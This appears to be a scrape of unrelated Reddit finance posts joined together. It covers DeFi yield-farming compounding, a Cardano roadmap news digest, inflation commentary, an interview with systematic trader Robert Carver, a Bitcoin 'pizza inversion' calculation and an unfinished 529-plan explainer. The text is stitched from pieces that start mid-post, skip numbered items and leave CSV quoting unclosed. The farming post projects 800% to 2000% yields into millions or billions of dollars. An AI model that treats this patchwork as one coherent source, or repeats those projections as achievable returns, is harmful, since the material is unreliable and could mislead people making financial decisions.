So normally on the ETH network gas fees are very high, so I typically don’t harvest until I have a very decent harvest – at least $1,500 or so (given I lose around $40 from gas). But having low gas networks like solona, BSC, xdai, avalanche and so on have gas fees of around 10c. So it is very easy to harvest your farms every day. Say for example a Cake / BNB farm. You might earn $100 of cake a day – you could then harvest, sell half into BNB, and repool the $100 of Cake and BNB back into your pool.

(Sorry if this is all hard to understand but the point of this post is the compounding effect, NOT the farming itself which is for another post).

So what happens to your gains if you are not just earning 800% per year, but every day you are taking your gains, and re-investing back with the same return?

Well this website (linked down below) allows you to calculate what you go. So for example, you can start with $1000. Put say, 10% interest, with daily compounding and you get a total of $1,105 at the end of the year – so you earned $105 instead of $100. Your 10% interest has turned into 10.5%

Okay… not bad. But let’s try it was 800% shall we? Well according to the calculator, instead of $8000, you get $2,734,186!!!!! An effective interest rate of 273,318%!

Not for something more sustainable – 100% interest. In that case you get $2,714 (so an extra $714). If you go half way (400%) you get $53,422. 600% is $384,221. And so forth. Basically, the higher the interest rate, the final compounded return is an order of magnitude above. As an extreme example, 2000% interest would get you 285 billion!!!

These results are so nuts I almost wonder if I am doing something wrong (and in fact I bet somebody will point that out!), but regardless – the impact of being able to compound your farming returns, in a high yield environment, even with “moderate” yields is absolutely huge. Use it to your advantage!!!!

EDIT: I should add one very important final point. While the strategy of compounding is likely to greatly increase your rewards, it works for everybody. And if there are multiple pools with 200-1500% currently operating (with a combined pool liquidity of tens or hundreds of million) ask yourself how sustainable these types of returns are for all participants. So a sceptic might say these results show that the current farming / yield returns can’t last forever.  And yes, as noted by somebody, good luck staying in a pool AND getting the return for a whole year.  So enjoy it while it lasts!

EDIT 2: I wanted to add another point. You can decent returns from other mechanism as well – whether it is trading, staking, or lending via CEFI. All of the compounding rules apply to these as well, and while they might have lower returns as an annual percentage, you could potentially be in these for a lot longer. So for example, compounding staking of ETH on the 2.0 chain could also produce staggering gains if your 8% return was re-invested, say, every week for 5 years. Again plug some numbers into the calculator and see!

10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul.  It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline.  Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia.  This is a great use case for the Cardano blockchain!

31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega.  Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon.  Ourobouros Praos was 2017 and it’s still running now.  Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server.  Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year.  It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot.  They could also add Hyperledger related permissioned sidechains with this.  
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way.  Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this. 
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting. 
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level.  There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
42. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

48. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)

Trading,Inflationary Pressure Builds,"The disinflationary and inflationary camps have been making good arguments against the effects of unprecedented fiscal spending (leading to growth in broad money supply). A main argument of the disinflationary proponents is that there is still a lot of debt in the system and that the stimulus cheques will be used to pay debt, instead of being spent in the economy. Hence the money goes back into the banking system, leading to disinflation, as the money is not being circulated in the economy.

We believe that the growth in the broad money supply (monetary inflation) is rather substantial, and there is risk that it is enough to overcome the disinflationary structural trends (debt, demographics, offshoring, and technology) for a while as we shift out of various state partial lockdowns, especially if a big infrastructure bill is also passed in 2021 or 2022. 

As the US pursues a loose fiscal and loose monetary policy, we suspect that the release valve will be a much weaker USD and assets like Bitcoin and Big Tech (companies with fortress balance sheets and pricing power) will do very well in the environment that is to come.

Forex,"*Trader Interview* Former manager of a multi-billion dollar portfolio at leading hedge fund, Man AHL (Rob Carver)","# Interview with Robert Carver: Former manager of a multi-billion dollar portfolio at leading hedge fund, Man AHL

This is one of the most interesting interviews I've done so far. Robert has a very different approach to the bank traders I've spoken with and is far more systematic, less discretionary. For example, his views on take profits and risk:reward are at odds with how bank traders tend to approach things. In the interview you'll get this thoughts on backtesting, common mistakes retail traders make, bet-sizing and continuous vs discrete trading rules ... and much more. As with all interviews, we will also take a quick journey through Robert's career and see how he began trading professionally in the first place and where things went from there. I hope you enjoy it and it useful! 

Official bio: *Robert Carver is an expert on systematic trading and a guest lecturer at Queen Mary University of London; a former head of fixed income at multi billion dollar quantitative hedge fund AHL and former investment bank trader, and the author of three books: ""Systematic Trading"", ""Smart Portfolios"" and ""Leveraged Trading"".*

# The background story

&amp;#x200B;

**How did you get into trading?**

The first trade I ever did would have been in mid '99, during the tech boom and just as online trading was becoming a big thing in the UK.

One of the early internet service providers, Freeserve, was IPOing and it was massively oversubscribed. I believe I had about £80 worth of shares. It got me really interested in markets and investing.

I’d originally studied Computer Science at university and started down a different career path - nothing to do with trading or markets - but decided at the age of 25 to go back and study Economics.

&amp;#x200B;

**What about your first job in this area?**

I worked part-time whilst studying. I’d got a job at one of these up-and-coming online stockbrokers. The timing wasn’t great, of course, as the dot com bubble was bursting but they still found interesting stuff for me to do because of my background in IT and skill with computers.

In the second year of uni, I applied for internships at various places. The only one that came through was at a firm called AHL, a quantitative hedge-fund. I think they liked that I had what was - in those days - a somewhat unusual background combining an interest in finance and markets but also computer science. That was an interesting mix, as far as they were concerned.

I did the internship over summer and I felt sure they’d offer me a job afterwards. I’d got on really well with everyone there. They were a small company at that time and not particularly well organised so I decided it would be sensible to apply to some big companies, too: the classic investment banks.

The banks were far more organised. On the applications I’d indicated I was interested in roles within the Research department. However, I ended up being interviewed for Trading roles. The only thing I can conclude is that they processed my psychometric test and thought “This guy is clearly a psychopath - let’s put him in Trading!” Anyway, this bank offered me the job.

&amp;#x200B;

**What happened next?**

I took it. The money was great for someone coming straight out of university. I’d just got married and my wife told me I’d end up hating the job. She was right. Ethical concerns aside, it was a terrible mix of being mentally demanding yet not intellectually stimulating.

I was working on the exotic rates options desk, which was about as complex as you could get at a bank. The best way I can describe it is: imagine trying to do a Sudoku challenge with lots of people shouting in your ear non-stop for ten hours a day.

I did a few years there and then decided to get a part-time Masters in Economics, whilst working full-time in a new job at the Centre for Economic Policy Research. At that point I thought I’d found my calling.

&amp;#x200B;

**I’m guessing fate intervened?**

Yes, by chance I saw a role appear over at AHL. I thought that I’d apply for it - if nothing else it’d be fun to see everyone again.

I ended up having the choice between continuing a career in economic research or joining AHL. I picked AHL. I had really enjoyed the whole interview process and the people I met, which left me with a pretty strong conviction that it would be the right decision.

&amp;#x200B;

**What did AHL want you to do for them?**

At the time AHL was purely focused on technical trading. By “technical trading” I mean price and volume are the only inputs into trading decisions. For example, if you have a strategy that’s looking at dividend yields that wouldn’t fall under this category.

They wanted me to introduce a new set of strategies that were focused on non technical trading. Say, for stocks, you might use things like Price/Earnings ratios as an input or macroeconomic data such as GDP or inflation readings.

This has its own challenges. When you get a price - that’s it, that’s the price. When you get GDP, it is often revised after the original release. The data is also very low frequency: many fundamental data points only update monthly or quarterly.

&amp;#x200B;

**But you must’ve also used price to some degree? Even if your model is using fundamental inputs there must be some concept of price and value.**

That’s right. It is a bit of a grey area. For the bond model we’d look at interest rates of course and interest rates are clearly related to the price of bonds.

After a few years the business decided that this fundamental and technical style split made less sense. They decided to bring it all together but split it along asset class lines. The usual kind of split: FX, commodities, equities and fixed income.

Because of my background in fixed income at the bank I was a natural fit for that group. There were people around who were cleverer than me but - I think in part because management thought that I could communicate well and get the other quants working together as a team - they put me in charge of the fixed income group.

That was a big job. You’re talking 40% of the AUM at a $30billion dollar hedge fund. A huge portfolio and huge volumes of trading.

It was also an interesting period. This started in 2010 and whilst we were managing the portfolio we had the European sovereign debt crisis and quantitative easing  in the US. Markets were moving and at times it got a bit hairy. In our worst week we lost one billion USD.

&amp;#x200B;

**Ouch. Do you still think of it in monetary terms or are you able to abstract it away to a percentage? Like “we’re down 11%” rather than $1 billion.**

I always advise people to look at it in percentage terms for exactly that reason. If you look at it in nominal terms it is psychologically hard.

Even now - perhaps especially now - when I am running my own money and the sums are far, far smaller,  I still try to think in percentages. Of course it would only take me a fraction of a second to do the conversion but I want to try and keep it abstract.

Anyway, we’d had a new guy join the team recently at AHL and so I was catching up with him for a coffee. I asked him how things were going. He just sat there shaking his head, saying “I cannot believe we are down a billion dollars and everyone’s just going about their work like everything is fine.”

He was right. If that had happened in a discretionary hedge fund there would’ve been screaming and shouting and so on. However, in our team people were calm and unflustered because they had successfully abstracted performance to a percentage and it was not an extreme percentage - we simply had a large amount of assets under management.

# Views on various aspects of trading

**Your background is heavily systematic. Yet in one of your books you describe a purely discretionary trade. You managed to bottom-tick the UK banks during the Global Financial Crisis. I’m curious as to why you would sometimes trade like this when you are so clearly a believer in systematic trading?**

I always say that I personally don’t have enough skill to be a discretionary trader.

What I’ve managed to do fairly successfully is pick two market tops and two market bottoms within a few months of the event. In 2009 I felt the market was close to the bottom. However, that’s happened a handful of times over fifteen years.

There’s two problems with this. You cannot make a trading career out of picking four occasions over fifteen years. Then I put my statistician hat on and think: there’s not much of a sample size, is this just luck?

I might have some ability to sense big moments of change. However, that’s not how I do the vast majority of my trading. The reason I put it in the book was to illustrate a point: because I had no system for risk and position management back then I ended up not putting enough size on. I had the right idea but I didn’t make as much as I should have from it.

I split the world into three categorie

* People who cannot make the right discretionary calls (most of us);
* People who can sometimes make the right discretionary calls but don’t have a system (that was me in 2009);
* People who can make the right calls and also have some intuition for risk management and position sizing.

There are really only a tiny, tiny group of people in that third category. People in the first category should let the system decide when and what to trade and also do the risk management. People in the second category might make the trading decisions themselves but should use a system to help them decide risk management parameters such as the size of position and exit points.

&amp;#x200B;

**One sentiment I get from a lot of your writing is that people should spend far less time on trade ideation and far more time learning to avoid making basic mistakes. Can you talk about this?**

The three big mistakes I think people make are overconfidence, over-trading and over-leveraging.

The core problem people have is they do not have a good appreciation of luck. In most things humans do there isn’t that much luck involved - or at least the luck isn’t obvious. Think about learning to drive: the more you practice then the better you’ll get, up to a point. That is a reliable outcome.

If a formula one driver, say, took a driving test 100 times you might expect them to pass it every time or at least the vast majority of times. The markets just aren’t like that at all. There is far more noise. The equivalent world-class trader might only be winning just over half the time on her trades.

&amp;#x200B;

**Can you give an example of how this overconfidence manifests itself?**

Let’s say someone has made 100% returns over a three-month period and they start to feel invincible.

Let’s look at what they did; they just bought Gamestop and held it. That unfortunately tells us very little. You need a large sample of trades - hundreds or more likely thousands - before you really have any idea if a trader has skill or not.

This leads us onto the subject of over-trading. Because of apps like RobinHood that market themselves as 'free trading' people think they can trade for free but this is not true. There’s still the spread. It might only be 0.5% but after 200 trades you’ve lost it all in spread.

People are overconfident and feel like they can overcome the spread but in reality - even if they’re highly skilled - there’s a lot of noise in their results. Even if they can make enough on average to cover trading costs, there will be periods of low performance whilst trading costs are always there and will constantly chip away at your money.

Over-trading is probably the one thing that most people get wrong. Certain apps even gamify this and do things like make confetti appear on the screen whenever you trade. Over-leveraging is also a huge problem but I think there is more awareness of this. People know too much leverage is dangerous and the regulators make some attempts to dampen it.

&amp;#x200B;

&gt;There are two reliable ways to lose money. You can do it quickly through too much leverage or you can do it slowly by over-trading but either way you end up at zero.**Robert Carver**

&amp;#x200B;

&amp;#x200B;

**What kind of trading horizons do you have yourself? It would be revealing to see what you consider to be not over-trading.**

It depends on the cost of trading each instrument. The more times you trade each year, the higher the costs are. The tighter the spreads of an instrument happen to be, the more times you can afford to trade that instrument each year.

The most liquid thing I trade would be the S&amp;P 500 futures contract. In practice I probably have an average holding period of about two weeks for that.

I could maybe stretch that to one week. However, forgetting about costs for a moment, the reason I do not trade faster than that is a property of moving average systems. When you start to reduce the time horizons the behaviour is different. I’m simplifying to make this point but below two weeks you’ll often observe mean reversion characteristics whereas beyond that instruments will typically trend.

The most expensive thing I trade is the Eurodollar interest rate future and there you’re looking at a holding period of several months. There are many less liquid instruments that I would never trade due to their transaction costs.

&amp;#x200B;

**Let’s talk about these online leaderboards and copy trading. I feel they’re very unreasonable. They are set up by default to rank strategies by nominal return, which simply rewards high risk strategies rather than high quality ones.**

I hate those sites.

One issue with them is that a very easy way to game yourself to the top is to submit dozens and dozens of strategies doing opposite things and people will only see the one that worked out.

You also have questions around how ‘live’ are the live trading results, really - do they include real-life transaction costs and so on?

I knew a guy who went to work for one of these firms and genuinely wanted to make them better. As you say - he wanted to give a notion of risk adjusted return and trader skill. However, he couldn’t get it past the marketing department and nothing changed.

What you really need if you are comparing strategies is some basic measure of risk-adjusted return. Imagine you have Strategy A which takes one unit of risk but makes 25%. Now imagine you have Strategy B which takes two units of risk but makes 30%. Well you could just leverage Strategy A 2:1 and have 50% return instead of Strategy B’s 30% for the same level of risk.

Now let’s think about what “risk” means. There are problems with this. Some people like to look at max drawdown. Some people calculate standard deviations of returns, although the problem with this is it makes assumptions about the distribution of returns which will not always hold. For example, it is unlikely to be the case that returns fit a symmetrical distribution where the characteristics of positive days exactly mirror the negative. Extreme events are also far more common in real life than you would expect from using many such models.

&amp;#x200B;

**At this point it might make sense to explain skewness?**

Skewness is an interesting concept.

An asset that is negatively skewed is one with a higher proportion of winning days but where the losing days are larger in magnitude than the winning days. An example would be selling options. On the majority of days you will collect a small positive return from the premium of the options you have sold. However, there is always lurking in the background a tail risk of an extremely large loss. A lack of appreciation of this has [caused many firms to blow up](https://earlyretirementnow.com/2018/12/18/the-optionsellers-debacle/).

On the other side you have positive skew assets. These have a bias to lose a small amount on the typical (modal) day but can have explosive upside when they do win. Owning VIX would be an example of this.

Now let’s think about leverage: if you calibrate your leverage for the average day and have a negatively skewed strategy then you might do really well for a period. However when the infrequent but extremely large negative day arrives you will find yourself over-leveraged and in a lot of trouble. You have to be especially careful with leverage on negatively skewed strategies.

Many strategies that look the best in terms of risk-adjusted returns tend to have negative skew. FX carry is another example of this. So there’s nothing inherently wrong with having a negatively skewed asset but you simply don’t want to have too much of it. You want these strategies to be part of a diversified portfolio of other strategies that have positive skew as well.

**I'd like to turn to backtesting. An area you've discussed often. A lot of new traders have little or no statistical training and use off-the-shelf backtesting software. Why is it that so many traders are sure they’ve found the holy grail - “I will be rich in six months!” - yet invariably this turns out not to be the case?**

&amp;#x200B;

I’d always written my own software and had never used one of those off-the-shelf optimisers until some of my students - I’m a part-time university lecturer - came to me, convinced they’d found a too-good-to-be-true strategy and wanting to get my thoughts.

The first thing you have to make sure of is that you are only backtesting using out-of-sample data. You cannot mislead yourself by letting the system ‘trade’ on data that it has already seen when generating your model. This sometimes creates problems for people as they feel they don’t have enough data but this is non negotiable. If you have a slow trading system like mine, you will want years and perhaps decades of data for backtesting.

The second issue with these commercial back-testers is how the fitting actually takes place. One of the dangers is that they offer a huge amount of fitting options, most of them pretty black box so it is hard to get intuition for what they’re doing under the hood.

What you want when fitting is robustness, meaning that you haven’t over-fitted parameters to the past. I’ll give you an example. I use about eight different moving averages and a not very robust way to do things would be to run them all and just pick the one with the best performance on the backtest. That makes no sense: there is little evidence to suggest that a particular moving average will remain the best in future. A more robust method would be to trade an average of those things. Keeping it simple and equally weighting them is generally a reasonable starting point.

&amp;#x200B;

**You’ve also written about ‘implicit fitting’ which is interesting as it is an even more subtle mistake. What is ‘implicit fitting’?**

Imagine I do everything right and am only using out-of-sample data and the model outputs some performance data.

However, I look at it and think “Hmm. I’m sure we can do better than that” so I go and tweak some of the higher level parameters and re-run it till we arrive at a more appealing result.

That is still cheating because you are using in-sample data! My changes are informed by the trading results i.e. from seeing the price data which in real life can only be known after the fact. The model will appear better than it is likely to perform in real-life, where it is not encoded with knowledge of what the future holds.

&amp;#x200B;

**If we take a motivated retail investor - someone who makes an effort to do things properly but not from within an institution - are they better off sticking to simple and well known strategies like momentum and carry?**

I think that everyone should start there.

There’s a lot to be said for trading a well established strategy that is intuitive and has a long track record. This is the beginning of a learning process and you are going to develop risk management and the other parts of the system from the experience that you gain.

Some people will be happy sticking with this kind of system for the long-run and that’s fine.  Others will look for ways to refine the starter system further - this is where I sit - and this is perfectly reasonable if you are deeply interested in this stuff and willing to spend lots of time on it.

The third approach is people who have some reason to believe they have a strong discretionary ability to pick trades. They may choose not use momentum and carry directly but even they will benefit from sticking with the principles of risk management that are encoded in the system with which they started.

&amp;#x200B;

**Given carry and momentum are so widely known and used, why do you think they still exist? Why haven’t they been arbitraged away?**

The answer comes in two parts. They exist because of psychological biases that afflict investors and they don’t disappear because they’re not slam dunks.

These kind of strategies do not make large profits every single year. If they did then everyone would use them and they’d disappear. On average, over the long-run they work but this stuff is not going to provide supernormal returns day-in, day-out.

If you pick an arbitrary trend following system on a arbitrary instrument the Sharpe ratio is going to be something like 0.2, which is not brilliant. Where it really hums is when you diversify across many markets and that requires more capital than most individuals have. You also have to avoid making the sorts of mistakes we’ve discussed, which clearly many people do not manage.

Now, why do they exist? Because they do things that humans find uncomfortable. The technical term is that they are 'risk premia'. Think of it like an insurance premium, where you’re being paid to take on some risk so someone else doesn’t have to do so.

If we look at FX carry, for example, you make money overall but returns are punctuated by sharp drawdowns. People don’t like those so they don’t like to put on carry trades. So if you are willing to put the carry trade on you are getting compensated for this.

Similarly trend following works because many people take profit too early. If they buy something and it goes up, they worry about it going back down and sell it when they really should just hold on. There is [a lot of literature on this topic](https://www.behavioraleconomics.com/resources/mini-encyclopedia-of-be/prospect-theory/).

&amp;#x200B;

**You are really not a fan of take profits are you?**

I think one of the reasons it is a popular idea is this concept of risk:reward. People will say things like “I’m risking X to make 2X.” The nice thing about that, of course, is that you don’t need to get every trade correct. Even if you only call half your trades you’d make money on a 1:2 ratio.

However, I don’t like it at all because it ignores basic facts. For example, over the kind of time horizons a retail trader should be trading, markets tend to trend. So I find it particularly odd when people combine this methodology with a trend following strategy.

The market doesn’t know or care about your two risk units. If your system believes that the trend is likely to keep continuing you should stay in it. Your system or your stop loss will tell you when the trend has ended.

I’m talking here about arbitrary take profits. If you have a model that is specifically predicting that, say, the fair value of an asset is 200 then of course it makes sense to take profit and exit once that price has been reached.

I do think that trailing stop losses are a useful tool that more traders might consider using instead of arbitrary take profits.

&amp;#x200B;

[Illustrative example of a trailing SL](https://preview.redd.it/6glbs5gb0xs61.png?width=1200&amp;format=png&amp;auto=webp&amp;s=37a31fd421490c47f0d8d3e8617a45301e6efc0e)

&amp;#x200B;

**This is similar to the classic mistake of picking a stop loss level, based on PNL.**

Yes. Where you leave your stop loss should be decided by taking into consideration the volatility of the instrument and your time horizons. It should absolutely not be chosen based on the nominal amount of PNL that you would lose, should it be triggered.

All else being equal, traders with large and small accounts should have the same stop loss price level. The only thing that should differ according to account balance is their position size.

The market doesn’t care if you’ve lost 10% of your account at a certain price. You should calibrate your position size for the risk you are willing to take, after you’ve selected an appropriate price level for your stop loss.

&amp;#x200B;

**Perhaps this is a good point to talk about continuous trading rules, which you’ve written about recently. This is a method that I’ve observed frequently amongst professional traders yet seems uncommon in retail. Can you explain how it works?**

Most people trade with binary trading rules. Say, for example, a moving average crosses another then I do a trade. I buy one unit of risk, let’s say. At some point you want to get out of the trade - say you hit your stop loss - so you sell one unit to go flat.

The important thing to take away is that you are treating all trades the same. You risk the same every time. You are ignoring any difference in expectancy.

&amp;#x200B;

**Unlike, say, poker where you bet more when you know your hand is stronger or less when you are uncertain or know it is weaker?**

Exactly. Now, if I think a trade is fantastic I should put on a bigger size. If I am less certain, I should risk a smaller amount.

Think about trend following and momentum. When a trend has lasted a long time and is smooth - meaning it has trended in a fairly straight line without significant reversals - there’s a statistically higher chance it will continue than if the trend is short-lived or very jagged. I should be more confident in the former scenario than the latter.

So let’s think about how that looks in practice in a continuous system. The moving averages first cross over and you might buy a small amount as you have positive expectancy but you are not yet highly confident. As the trend progresses and the moving averages fan out more, you know the trend is stronger so you add to your position to reflect your increased confidence in the trade. You keep doing this until at some point the trend slows down and you start to gradually reduce your position all the way until you might flip short.

&amp;#x200B;

**That is quite clear. And discretionary traders do something similar. For example, Druckenmiller has talked about ‘pyramiding’ into a big position.**

Yes. Even if you are making discretionary calls you still need to score them. One idea might be a 10 and another a 5. You will still trade the 5 but perhaps in half the size.

If you are systematic it is much easier to evaluate if continuous trading works. You can look and see if the trades your model was most confident about do indeed outperform the others.  If you are discretionary that is harder to do but at least by recording your scores pre trade you can review them afterwards and get a feel for it.

&amp;#x200B;

**Do you require a level of intuition behind the strategies you trade or would you trade something when you don’t understand why it works, provided the data looked good enough and the back-testing process was rigorous?**

I personally would not. There are firms who do trade this kind of stuff - ‘ghost patterns’ they’re sometimes called - and some of them are extremely successful. However, I wouldn’t recommend it for the average retail investor. You need a huge amount of experience and skill to avoid falling into traps like subtle over-fitting. It is dangerous stuff.

Even at places like AHL you could see people struggle with this at times. We did a data mining exercise, looking for pairs or triplets of instruments that we could use in relative value trading. By this I mean we’d, for example, buy one instrument and sell a linked instrument and wait for the two prices to converge.

A particular result looked interesting: live cattle futures and the NZDUSD. The researchers tried to rationalise it by talking about all the sheep in New Zealand and people choosing between eating beef and lamb and so on. The reality is that if you look at enough instruments you will end up finding some relationships that appear to be real but turn out to be spurious and don’t last. They were rationalising post hoc a pattern that they’d found due to sheer chance.

&amp;#x200B;

**You publish your trading and investing results every year. Does the act of publishing them change how you trade and invest?**

I don’t consciously do things differently. Subconsciously I do think I feel like I should set a good example and practise what I preach. A good example would be around the pandemic last year. I decided to dial down risk based on one of my one-in-five-years views and I had to hold my hands up and put it in the report.

This happens in systematic funds, too. The managers do not aim to interfere with the trading system but they may well use human discretion to dial-up or down the risk at a given point of time - thinking about investor reactions to big drawdowns, for example - and this can have a big effect on performance.

I’ve only published my results over the last seven years, whilst I’ve been an independent trader. In that period I’ve also made a concerted effort to become more systematic in how I approach trading and investment so this is a style change that coincided with my public reports but I am not sure it was motivated by them. I do think that the act of writing it up has probably made my thinking more structured.

&amp;#x200B;

**The point about having investors to whom one must answer is an interesting one. The clear fact is retail traders overwhelmingly lose money - around 7 in 10. However, the independent trader does have some advantages over the institutional trader. For one thing she is likely to have a smaller account so she can be nimble and not worry about market impact and excessive trading costs. For another, there are no external investors to constrain her behaviour. What do you think about this? Is retail trading a reasonable activity or should people stop doing it?**

It comes down to why you are doing it.

If you are trading purely for financial reasons, the average person should do very little. Just buy a diversified passive tracker.

I believe trading done well will get you a better risk-adjusted return than passive investment because you can get access to these other sources of risk premia. However, it requires a lot of time and effort to do it well.

What worries me is people who view trading as an easy way to get rich quick. That is highly unrealistic, especially with a small starting account balance and little to no experience.

Then there are people for whom trading is more like gambling. People who go into it, expecting to lose a small amount of money, but consider it fun and just another form of entertainment. We saw a lot of this recently with Gamestop.  That is probably okay as well but I do worry about ‘problem gamblers’ as this industry is regulated differently to gambling and the same level of consumer protections do not really exist.

&amp;#x200B;

**If they take nothing else away from this interview, what advice would you have for a retail trader?**

Keep it small and keep it simple.

Bitcoin,"Historical: Today We Celebrate PIZZA INVERSION: On 22 May 2010 You Got 2 Pizzas For 10,000 BTC. Today You Get 10,000 Pizzas For 2 BTC!","Here's why this ""Pizza Inversion"" happens exactly at 62500 USD per bitcoin:

On 22 May 2010 Laszlo Hanyecz from Jacksonville, Florida, settled the purchase of 2 pizzas for 10,000 BTC on bitcointalk.org [1],[3]. The value of these 2 pizzas together was 25 USD [4] (and not 41 USD by the way, as often erroneously reported in various sources on the internet with reference to [2]. But what is relevant for the legendary pizza purchase is only the real-world value of these two pizzas and not the BTC exchange rate four days earlier on an unrelated BTC exchange).

**On 22 May 2010:**     
10000 BTC = 2 pizzas (each pizza having a market value of 12.50 USD)     
--&gt; 10000 BTC = 25 USD     
--&gt; 1 BTC = 0.0025 USD = 1/4 cent

**On Pizza Inversion Day (13 April 2021):**     
10000 pizzas = 2 BTC (each pizza having a market value of 12.50 USD)     
--&gt; 125000 USD = 2 BTC     
--&gt; 62500 USD = 1 BTC

**Fun facts:**     

- Bitcoin's increase in value from 1/4 cent to 62500 USD corresponds to an ***increase by a factor of 25 Million***, or an increase of +2,499,999,900 %, i.e. ***2.4999999 Billion percent***, or ca. +370 % p.a. on average within this ca. 11 year period.

- Today, the 10,000 BTC are worth 625 Million USD.

- For number mystics: The time between Pizza Day (22 May 2010) and Pizza Inversion Day (13 Apr 2021) is exactly 3826 days. This is 2 times 1913. In the year 1913 the [FED was founded](https://en.wikipedia.org/wiki/Federal_Reserve_Act).

personalfinance,Information about college (529) savings plans,"Here is some information about 529   plans, with the goal of crowdsourcing comments towards creation of a wiki page.

- What is a 529 plan?

A 529 plan is a tax-advantaged investment account   for higher education expenses, as well as some private primary / secondary tuition.  Higher education expenses include  tuition, fees, books, computers, room and board, and $10,000 lifetime in student loans.  They do not include e.g. transportation or health insurance. This is your go-to plan to save for your kids' college education, but with some potential pitfalls described later. 

A 529 is something like a  401k, with institutional control and individual account ownership, and it then adds a named beneficiary.   The owner controls the money;   the beneficiary incurs the allowable expenses.    The owner decides how to invest the money based on investment choices allowed by the particular 529 plan chosen. These choices are often like target-date funds with dates appropriate for your expenses.  If you want multiple concurrent beneficiaries, you typically use multiple accounts.  

